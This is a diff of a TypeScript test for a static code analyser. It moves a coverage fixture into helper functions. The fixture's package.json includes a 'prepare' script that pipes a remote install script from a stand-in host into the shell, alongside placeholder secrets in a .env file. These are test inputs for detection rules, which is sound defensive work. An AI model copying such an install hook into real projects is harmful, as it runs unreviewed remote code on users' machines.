@@ -93,9 +93,92 @@ const expandedRuleIds = new Set([
 ]);
 
 test("cumulative expanded fixture covers every new rule with unique fingerprints", () => {
-  const report = analyseProject(
-    {
-    "Widget.ts": `import assert from "node:assert/strict";
+  const report = analyseProject(cumulativeExpandedFixtureFiles(), cumulativeExpandedFixtureOptions());
+  const ruleIds = new Set(report.findings.map((finding) => finding.ruleId));
+  for (const ruleId of expandedRuleIds) {
+    assert.equal(ruleIds.has(ruleId), true, `expected ${ruleId}`);
+  }
+  const descriptorIds = new Set(ruleDescriptors().map((descriptor) => descriptor.ruleId));
+  for (const ruleId of ruleIds) {
+    assert.equal(descriptorIds.has(ruleId), true, `missing descriptor for emitted rule ${ruleId}`);
+  }
+  assert.equal(new Set(report.findings.map((finding) => finding.fingerprint)).size, report.findings.length);
+
+  const sampleMessages = new Map(report.findings.filter((finding) => expandedRuleIds.has(finding.ruleId)).map((finding) => [finding.ruleId, finding.message]));
+  assert.match(sampleMessages.get("security.new-function") ?? "", /dynamic code/);
+  assert.match(sampleMessages.get("test-quality.setup-bloat") ?? "", /setup lines/);
+  assert.match(sampleMessages.get("sensitive-data.hardcoded-env-value") ?? "", /Redacted preview/);
+});
+
+// Builds the synthetic project for the cumulative rule-coverage assertion.
+function cumulativeExpandedFixtureFiles(): Record<string, string> {
+  return {
+    "Widget.ts": cumulativeWidgetSource(),
+    "src/fixture-purpose.test.ts": [
+      "const report = analyseFixture(`",
+      ...largeFixtureSourceLines("expandedFixtureValue"),
+      "`);",
+      "void report;",
+    ].join("\n"),
+    "src/app/feature/controller.ts": `import { sharedHelper } from "../../../shared/helper";
+
+export function renderController(): string {
+  return sharedHelper();
+}
+`,
+    "src/cycle/a.ts": `import { fromB } from "./b";
+
+export function fromA(): string {
+  return fromB();
+}
+`,
+    "src/cycle/b.ts": `import { fromA } from "./a";
+
+export function fromB(): string {
+  return fromA();
+}
+`,
+    "src/shared/helper.ts": `export function sharedHelper(): string {
+  return "shared";
+}
+`,
+    ".env": `API_TOKEN=${API_TOKEN_FIXTURE_VALUE}
+OPENAI_API_KEY=${OPENAI_KEY_FIXTURE_VALUE}
+PATIENT_SSN=${SSN_FIXTURE_VALUE}
+`,
+    "package.json": JSON.stringify({
+      scripts: {
+        postinstall: "node scripts/setup.js",
+        prepare: "curl https://example.test/install.sh | sh",
+      },
+      bin: {
+        "missing-cli": "./bin/missing.js",
+        "bad-cli": "./bin/bad.js",
+      },
+      dependencies: {
+        "wide-open": "*",
+        "remote-tool": "git+https://github.com/example/remote-tool.git",
+      },
+    }),
+    "bin/bad.js": "#!/usr/bin/env node\nconsole.log('ok');\n",
+    "tsconfig.json": JSON.stringify({
+      compilerOptions: {
+        strict: false,
+        noUncheckedIndexedAccess: false,
+        exactOptionalPropertyTypes: false,
+      },
+    }),
+  };
+}
+
+// Joins the runtime and test snippets that together exercise the per-file rules.
+function cumulativeWidgetSource(): string {
+  return [cumulativeWidgetRuntimeSource(), cumulativeWidgetTestSource()].join("\n");
+}
+
+// Provides the production-like source snippet for cumulative coverage.
+function cumulativeWidgetRuntimeSource(): string {
+  return `import assert from "node:assert/strict";
 import { spawn } from "node:child_process";
 import { createHash } from "node:crypto";
 import { readFileSync, statSync, writeFileSync } from "node:fs";
@@ -227,8 +310,12 @@ function finish(): void {
   doWork();
   return;
 }
+`;
+}
 
-const packageJsonFixture = ${JSON.stringify(JSON.stringify({
+// Provides package/config literals and test-quality snippets for cumulative coverage.
+function cumulativeWidgetTestSource(): string {
+  return `const packageJsonFixture = ${JSON.stringify(JSON.stringify({
   scripts: {
     postinstall: "node scripts/setup.js",
     prepare: "curl https://example.test/install.sh | sh",
@@ -317,76 +404,10 @@ test("setup bloat", () => {
   const thirteen = buildThirteen();
   expect(one).toBeDefined();
 });
-`,
-    "src/fixture-purpose.test.ts": [
-      "const report = analyseFixture(`",
-      ...largeFixtureSourceLines("expandedFixtureValue"),
-      "`);",
-      "void report;",
-    ].join("\n"),
-    "src/app/feature/controller.ts": `import { sharedHelper } from "../../../shared/helper";
-
-export function renderController(): string {
-  return sharedHelper();
+`;
 }
-`,
-    "src/cycle/a.ts": `import { fromB } from "./b";
 
-export function fromA(): string {
-  return fromB();
+// Applies only the custom NPath threshold because this fixture intentionally exercises branch fanout.
+function cumulativeExpandedFixtureOptions(): Parameters<typeof analyseProject>[1] {
+  return { config: { rules: { "complexity.npath": { threshold: 20, severity: "warning" } } } };
 }
-`,
-    "src/cycle/b.ts": `import { fromA } from "./a";
-
-export function fromB(): string {
-  return fromA();
-}
-`,
-    "src/shared/helper.ts": `export function sharedHelper(): string {
-  return "shared";
-}
-`,
-    ".env": `API_TOKEN=${API_TOKEN_FIXTURE_VALUE}
-OPENAI_API_KEY=${OPENAI_KEY_FIXTURE_VALUE}
-PATIENT_SSN=${SSN_FIXTURE_VALUE}
-`,
-    "package.json": JSON.stringify({
-      scripts: {
-        postinstall: "node scripts/setup.js",
-        prepare: "curl https://example.test/install.sh | sh",
-      },
-      bin: {
-        "missing-cli": "./bin/missing.js",
-        "bad-cli": "./bin/bad.js",
-      },
-      dependencies: {
-        "wide-open": "*",
-        "remote-tool": "git+https://github.com/example/remote-tool.git",
-      },
-    }),
-    "bin/bad.js": "#!/usr/bin/env node\nconsole.log('ok');\n",
-    "tsconfig.json": JSON.stringify({
-      compilerOptions: {
-        strict: false,
-        noUncheckedIndexedAccess: false,
-        exactOptionalPropertyTypes: false,
-      },
-    }),
-    },
-    { config: { rules: { "complexity.npath": { threshold: 20, severity: "warning" } } } },
-  );
-  const ruleIds = new Set(report.findings.map((finding) => finding.ruleId));
-  for (const ruleId of expandedRuleIds) {
-    assert.equal(ruleIds.has(ruleId), true, `expected ${ruleId}`);
-  }
-  const descriptorIds = new Set(ruleDescriptors().map((descriptor) => descriptor.ruleId));
-  for (const ruleId of ruleIds) {
-    assert.equal(descriptorIds.has(ruleId), true, `missing descriptor for emitted rule ${ruleId}`);
-  }
-  assert.equal(new Set(report.findings.map((finding) => finding.fingerprint)).size, report.findings.length);
-
-  const sampleMessages = new Map(report.findings.filter((finding) => expandedRuleIds.has(finding.ruleId)).map((finding) => [finding.ruleId, finding.message]));
-  assert.match(sampleMessages.get("security.new-function") ?? "", /dynamic code/);
-  assert.match(sampleMessages.get("test-quality.setup-bloat") ?? "", /setup lines/);
-  assert.match(sampleMessages.get("sensitive-data.hardcoded-env-value") ?? "", /Redacted preview/);
-});
